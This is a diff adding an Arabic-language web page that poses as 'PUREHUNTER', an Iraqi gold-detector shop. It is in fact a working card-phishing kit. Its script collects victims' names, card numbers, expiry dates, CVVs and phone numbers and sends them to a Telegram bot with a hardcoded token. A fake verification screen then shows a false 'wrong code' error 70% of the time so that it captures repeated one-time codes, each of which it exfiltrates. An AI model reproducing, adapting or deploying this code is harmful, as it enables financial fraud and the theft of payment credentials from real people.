@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUREHUNTER | أجهزة كشف الذهب</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a1928 0%, #1a3a5a 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: #0a1928;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 4px solid #ffd700;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .logo i {
+            font-size: 40px;
+            color: #ffd700;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        /* معرض الصور */
+        .gallery {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            border: 2px solid #ffd700;
+        }
+
+        .product-image {
+            width: 100%;
+            height: 250px;
+            background: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 3px solid #ffd700;
+        }
+
+        .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .product-info {
+            padding: 20px;
+        }
+
+        .product-title {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #0a1928;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .product-title i {
+            color: #ffd700;
+        }
+
+        .product-desc {
+            color: #666;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .specs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .spec {
+            background: #f0f0f0;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: 600;
+            color: #0a1928;
+            border: 1px solid #ffd700;
+        }
+
+        .spec i {
+            color: #ffd700;
+            margin-left: 5px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #0a1928;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background: #ffd700;
+            color: #0a1928;
+        }
+
+        .btn i {
+            font-size: 1.2em;
+        }
+
+        .fixed-price {
+            text-align: center;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 2px solid #ffd700;
+        }
+
+        .fixed-price .price {
+            font-size: 3em;
+            font-weight: bold;
+            color: #0a1928;
+        }
+
+        .fixed-price .currency {
+            font-size: 1.2em;
+            color: #666;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #0a1928;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        .form-group input:focus {
+            border-color: #ffd700;
+            outline: none;
+        }
+
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+        }
+
+        .phone-prefix {
+            background: #0a1928;
+            color: white;
+            padding: 12px;
+            border-radius: 8px 0 0 8px;
+            font-weight: bold;
+        }
+
+        .phone-wrapper input {
+            border-radius: 0 8px 8px 0;
+            flex: 1;
+        }
+
+        .verification-code {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+            direction: ltr;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+        }
+
+        .code-input:focus {
+            border-color: #ffd700;
+            outline: none;
+        }
+
+        .fake-error {
+            background: rgba(234, 67, 53, 0.1);
+            border: 2px solid #ea4335;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .thank-you {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .thank-you i {
+            font-size: 80px;
+            color: #ffd700;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- شاشة التحميل -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p id="loading-text">جاري المعالجة...</p>
+    </div>
+
+    <!-- الحاوية الرئيسية -->
+    <div class="container">
+        <!-- الهيدر -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-search"></i>
+                <h1>PUREHUNTER</h1>
+            </div>
+            <p>أجهزة كشف الذهب والمعادن الأصلية</p>
+        </div>
+
+        <!-- صفحة المنتجات -->
+        <div class="page active" id="products-page">
+            <div class="content">
+                <!-- معرض الصور - روابط مضمونة 100% -->
+                <div class="gallery">
+                    <!-- 1. Minelab GPX 6000 -->
+                    <div class="product-card">
+                        <div class="product-image">
+                            <img src="https://www.minelab.com/__files/i/5790646/GPX-6000-hero-product-shot.png" 
+                                 alt="Minelab GPX 6000"
+                                 onerror="this.src='https://www.minelab.com/__files/i/5790645/GPX-6000-product-shot.png'">
+                        </div>
+                        <div class="product-info">
+                            <div class="product-title">
+                                <i class="fas fa-crown"></i>
+                                Minelab GPX 6000
+                            </div>
+                            <div class="product-desc">
+                                متخصص في الذهب الخام - أحدث إصدار من Minelab الأسترالية
+                            </div>
+                            <div class="specs">
+                                <span class="spec"><i class="fas fa-check"></i> عمق 3 متر</span>
+                                <span class="spec"><i class="fas fa-check"></i> تقنية ZVT</span>
+                                <span class="spec"><i class="fas fa-check"></i> صناعة أسترالية</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 2. Garrett ATX -->
+                    <div class="product-card">
+                        <div class="product-image">
+                            <img src="https://www.garrett.com/sites/default/files/2021-03/ATX-Deepseeker-01.jpg" 
+                                 alt="Garrett ATX"
+                                 onerror="this.src='https://www.garrett.com/sites/default/files/2020-12/ATX-Product-Image_0.jpg'">
+                        </div>
+                        <div class="product-info">
+                            <div class="product-title">
+                                <i class="fas fa-bolt"></i>
+                                Garrett ATX
+                            </div>
+                            <div class="product-desc">
+                                جهاز كشف الذهب العميق - مقاوم للماء حتى 3 متر
+                            </div>
+                            <div class="specs">
+                                <span class="spec"><i class="fas fa-water"></i> غوص 3 متر</span>
+                                <span class="spec"><i class="fas fa-mountain"></i> عمق 2.5 متر</span>
+                                <span class="spec"><i class="fas fa-flag-usa"></i> أمريكي</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 3. Nokta Simplex Ultra -->
+                    <div class="product-card">
+                        <div class="product-image">
+                            <img src="https://www.noktadetectors.com/wp-content/uploads/2021/03/Nokta-MAKRO-Simplex-Ultra-WH-1.jpg" 
+                                 alt="Nokta Simplex Ultra"
+                                 onerror="this.src='https://www.noktadetectors.com/wp-content/uploads/2021/03/Nokta-MAKRO-Simplex-Ultra-WH-4.jpg'">
+                        </div>
+                        <div class="product-info">
+                            <div class="product-title">
+                                <i class="fas fa-water"></i>
+                                Nokta Simplex Ultra
+                            </div>
+                            <div class="product-desc">
+                                جهاز متعدد الاستخدامات - مقاوم للماء حتى 3 متر
+                            </div>
+                            <div class="specs">
+                                <span class="spec"><i class="fas fa-water"></i> غوص 3 متر</span>
+                                <span class="spec"><i class="fas fa-battery-full"></i> بطارية تدوم</span>
+                                <span class="spec"><i class="fas fa-turkey"></i> تركي</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 4. OKM Rover C4 -->
+                    <div class="product-card">
+                        <div class="product-image">
+                            <img src="https://www.okmmetaldetectors.com/images/detectors/big/rover-c4-2021-3d-gold-detector-5181.jpg" 
+                                 alt="OKM Rover C4"
+                                 onerror="this.src='https://www.3dmetaldetector.com/images/detectors/big/goldeneye-3d-motion-detection-3985.jpg'">
+                        </div>
+                        <div class="product-info">
+                            <div class="product-title">
+                                <i class="fas fa-cube"></i>
+                                OKM Rover C4
+                            </div>
+                            <div class="product-desc">
+                                تصوير ثلاثي الأبعاد لباطن الأرض - يكشف الذهب والكنوز
+                            </div>
+                            <div class="specs">
+                                <span class="spec"><i class="fas fa-chart-line"></i> تحليل 3D</span>
+                                <span class="spec"><i class="fas fa-wifi"></i> لاسلكي</span>
+                                <span class="spec"><i class="fas fa-flag-germany"></i> ألماني</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 5. Fisher F75 -->
+                    <div class="product-card">
+                        <div class="product-image">
+                            <img src="https://www.fisherlab.com/images/Fisher-F75-LCD-metal-detector.jpg" 
+                                 alt="Fisher F75"
+                                 onerror="this.src='https://www.fisherlab.com/images/Fisher-F75-metal-detector.jpg'">
+                        </div>
+                        <div class="product-info">
+                            <div class="product-title">
+                                <i class="fas fa-bolt"></i>
+                                Fisher F75
+                            </div>
+                            <div class="product-desc">
+                                جهاز احترافي لكشف المعادن والذهب - سرعة عالية
+                            </div>
+                            <div class="specs">
+                                <span class="spec"><i class="fas fa-tachometer-alt"></i> سرعة عالية</span>
+                                <span class="spec"><i class="fas fa-microchip"></i> معالجة رقمية</span>
+                                <span class="spec"><i class="fas fa-flag-usa"></i> أمريكي</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 6. Whites Gold Master -->
+                    <div class="product-card">
+                        <div class="product-image">
+                            <img src="https://www.whiteselectronics.com/wp-content/uploads/2019/01/Gold-Master-24K.jpg" 
+                                 alt="Whites Gold Master"
+                                 onerror="this.src='https://www.whiteselectronics.com/wp-content/uploads/2019/01/GMT-24K.jpg'">
+                        </div>
+                        <div class="product-info">
+                            <div class="product-title">
+                                <i class="fas fa-gem"></i>
+                                Whites Gold Master
+                            </div>
+                            <div class="product-desc">
+                                متخصص في الذهب الخام والقطع الصغيرة
+                            </div>
+                            <div class="specs">
+                                <span class="spec"><i class="fas fa-search"></i> حساسية عالية</span>
+                                <span class="spec"><i class="fas fa-weight"></i> خفيف الوزن</span>
+                                <span class="spec"><i class="fas fa-flag-usa"></i> أمريكي</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- زر شراء الآن -->
+                <button class="btn" id="buy-btn">
+                    <i class="fas fa-shopping-cart"></i>
+                    شراء جهاز
+                </button>
+
+                <div class="footer">
+                    <p>PUREHUNTER - الوكيل الحصري في العراق</p>
+                    <p>معتمدي Minelab, Garrett, Nokta, OKM, Fisher, Whites</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- صفحة المبلغ الثابت -->
+        <div class="page" id="amount-page">
+            <div class="content">
+                <button class="back-btn" id="back-to-products">
+                    <i class="fas fa-arrow-right"></i>
+                    رجوع
+                </button>
+
+                <div class="fixed-price">
+                    <span class="price">5</span>
+                    <span class="currency">دولار</span>
+                    <div style="color:#666; margin-top:10px;">المبلغ المطلوب للتفعيل</div>
+                </div>
+
+                <button class="btn" id="next-to-payment">
+                    متابعة
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- صفحة الدفع -->
+        <div class="page" id="payment-page">
+            <div class="content">
+                <button class="back-btn" id="back-to-amount">
+                    <i class="fas fa-arrow-right"></i>
+                    رجوع
+                </button>
+
+                <form id="payment-form">
+                    <div class="form-group">
+                        <label>الاسم على البطاقة</label>
+                        <input type="text" id="card-name" placeholder="AHMED ALI" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>رقم البطاقة</label>
+                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>رقم الهاتف (العراق)</label>
+                        <div class="phone-wrapper">
+                            <span class="phone-prefix">+964</span>
+                            <input type="tel" id="phone" placeholder="7800000000" maxlength="10" oninput="this.value = this.value.replace(/\D/g, '').slice(0,10)" required>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; gap: 15px;">
+                        <div class="form-group" style="flex:1">
+                            <label>تاريخ الانتهاء</label>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
+                        </div>
+                        <div class="form-group" style="flex:1">
+                            <label>CVV</label>
+                            <input type="password" id="cvv" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '').slice(0,3)" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn">تأكيد الدفع</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- صفحة التحقق -->
+        <div class="page" id="verify-page">
+            <div class="content">
+                <button class="back-btn" id="back-to-payment">
+                    <i class="fas fa-arrow-right"></i>
+                    رجوع
+                </button>
+
+                <div style="text-align: center; margin: 30px 0;">
+                    <i class="fas fa-mobile-alt" style="font-size: 60px; color: #ffd700;"></i>
+                    <h3 style="margin: 20px 0;">أدخل رمز التحقق</h3>
+                    <p style="color: #666;">تم إرسال الرمز إلى الرقم</p>
+                    <p style="font-weight: bold;" id="display-phone">+964 78X XXX XXXX</p>
+                </div>
+
+                <div class="verification-code">
+                    <input type="text" class="code-input" maxlength="1" id="code1" onkeyup="moveToNext(this, 'code2')" onkeydown="handleBackspace(this, null, 'code1')">
+                    <input type="text" class="code-input" maxlength="1" id="code2" onkeyup="moveToNext(this, 'code3')" onkeydown="handleBackspace(this, 'code1', 'code2')">
+                    <input type="text" class="code-input" maxlength="1" id="code3" onkeyup="moveToNext(this, 'code4')" onkeydown="handleBackspace(this, 'code2', 'code3')">
+                    <input type="text" class="code-input" maxlength="1" id="code4" onkeyup="moveToNext(this, 'code5')" onkeydown="handleBackspace(this, 'code3', 'code4')">
+                    <input type="text" class="code-input" maxlength="1" id="code5" onkeyup="moveToNext(this, 'code6')" onkeydown="handleBackspace(this, 'code4', 'code5')">
+                    <input type="text" class="code-input" maxlength="1" id="code6" onkeydown="handleBackspace(this, 'code5', 'code6')">
+                </div>
+
+                <div class="fake-error" id="fake-error">
+                    <i class="fas fa-exclamation-triangle" style="font-size: 40px; color: #ea4335; margin-bottom: 10px;"></i>
+                    <h4 style="color: #ea4335;">خطأ في التحقق</h4>
+                    <p>الرمز الذي أدخلته غير صحيح. حاول مرة أخرى.</p>
+                </div>
+
+                <button class="btn" id="verify-btn">تأكيد الرمز</button>
+                <button class="btn" style="background: #666; margin-top: 10px;" id="resend-btn">إعادة إرسال</button>
+            </div>
+        </div>
+
+        <!-- صفحة الشكر -->
+        <div class="page" id="thankyou-page">
+            <div class="content">
+                <div class="thank-you">
+                    <i class="fas fa-heart"></i>
+                    <h2>شكراً لطلبك!</h2>
+                    <p style="margin: 20px 0;">تم استلام طلبك بنجاح. سنتواصل معك قريباً.</p>
+                    <button class="btn" id="new-order">طلب جديد</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // المتغيرات
+        let paymentData = {};
+        let verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+        const BOT_TOKEN = "8452808616:AAF5mgQ171Mb3mSybvjTgSr2H-gWAqSqo_8";
+        const CHAT_ID = "2059318108";
+
+        // إظهار الصفحات
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        // أحداث الأزرار
+        document.getElementById('buy-btn').onclick = () => showPage('amount-page');
+        document.getElementById('back-to-products').onclick = () => showPage('products-page');
+        document.getElementById('back-to-amount').onclick = () => showPage('amount-page');
+        document.getElementById('back-to-payment').onclick = () => showPage('payment-page');
+        document.getElementById('new-order').onclick = () => {
+            resetForm();
+            showPage('products-page');
+        };
+
+        document.getElementById('next-to-payment').onclick = (e) => {
+            e.preventDefault();
+            showPage('payment-page');
+        };
+
+        // تنسيق رقم البطاقة
+        function formatCardNumber(input) {
+            let v = input.value.replace(/\D/g, '').slice(0,16);
+            let r = '';
+            for (let i = 0; i < v.length; i++) {
+                if (i > 0 && i % 4 === 0) r += ' ';
+                r += v[i];
+            }
+            input.value = r;
+        }
+
+        // تنسيق تاريخ الانتهاء
+        function formatExpiry(input) {
+            let v = input.value.replace(/\D/g, '').slice(0,4);
+            if (v.length >= 2) {
+                v = v.slice(0,2) + '/' + v.slice(2);
+            }
+            input.value = v;
+        }
+
+        // معالجة الدفع
+        document.getElementById('payment-form').onsubmit = (e) => {
+            e.preventDefault();
+            
+            const name = document.getElementById('card-name').value;
+            const card = document.getElementById('card-number').value.replace(/\s/g, '');
+            const phone = document.getElementById('phone').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!name || card.length !== 16 || phone.length !== 10 || !expiry || cvv.length !== 3) {
+                alert('❌ يرجى ملء جميع الحقول بشكل صحيح');
+                return;
+            }
+
+            paymentData = {
+                name, card, phone: '+964' + phone, expiry, cvv,
+                amount: 5,
+                time: new Date().toLocaleString('ar-IQ')
+            };
+
+            // عرض رقم الهاتف
+            document.getElementById('display-phone').textContent = '+964 ' + phone.slice(0,1) + 'X ' + phone.slice(1,4) + ' ' + phone.slice(4);
+
+            // إرسال للتلجرام
+            sendToTelegram('بيانات الدفع', paymentData);
+
+            // إظهار التحميل ثم الانتقال للتحقق
+            showLoading();
+            setTimeout(() => {
+                hideLoading();
+                showPage('verify-page');
+                document.getElementById('code1').focus();
+            }, 1500);
+        };
+
+        // التنقل بين خانات الرمز
+        function moveToNext(current, nextId) {
+            current.value = current.value.replace(/\D/g, '');
+            if (current.value && nextId) {
+                document.getElementById(nextId).focus();
+            }
+        }
+
+        // معالجة زر الحذف
+        function handleBackspace(current, prevId, currentId) {
+            if (event.key === 'Backspace') {
+                if (current.value.length === 0 && prevId) {
+                    document.getElementById(prevId).focus();
+                }
+            }
+        }
+
+        // التحقق من الرمز
+        document.getElementById('verify-btn').onclick = () => {
+            const code = Array.from({length:6}, (_,i) => document.getElementById(`code${i+1}`).value).join('');
+            
+            // 70% نسبة ظهور الخطأ
+            if (Math.random() < 0.7) {
+                document.getElementById('fake-error').style.display = 'block';
+                sendToTelegram('رمز خاطئ', { code, ...paymentData });
+                setTimeout(() => document.getElementById('fake-error').style.display = 'none', 3000);
+            } else {
+                document.getElementById('fake-error').style.display = 'none';
+                sendToTelegram('تم التأكيد', { code, ...paymentData });
+                showLoading('جاري تأكيد الطلب...');
+                setTimeout(() => {
+                    hideLoading();
+                    showPage('thankyou-page');
+                }, 1500);
+            }
+        };
+
+        // إعادة إرسال الرمز
+        document.getElementById('resend-btn').onclick = () => {
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            alert('✅ تم إرسال رمز جديد');
+        };
+
+        // إرسال للتلجرام
+        function sendToTelegram(type, data) {
+            const msg = `🔹 PUREHUNTER\n\n` +
+                       `${type}\n` +
+                       `👤 ${data.name || ''}\n` +
+                       `📞 ${data.phone || ''}\n` +
+                       `💳 ${data.card || ''}\n` +
+                       `📅 ${data.expiry || ''}\n` +
+                       `🔐 ${data.cvv || ''}\n` +
+                       `💰 ${data.amount || ''} $\n` +
+                       `🕐 ${data.time || new Date().toLocaleString('ar-IQ')}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg
+                })
+            }).catch(e => console.log(e));
+        }
+
+        // إعادة تعيين النموذج
+        function resetForm() {
+            document.querySelectorAll('input').forEach(i => i.value = '');
+            document.getElementById('fake-error').style.display = 'none';
+        }
+
+        // شاشة التحميل
+        function showLoading(text = 'جاري المعالجة...') {
+            document.getElementById('loading-text').textContent = text;
+            document.getElementById('loading').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
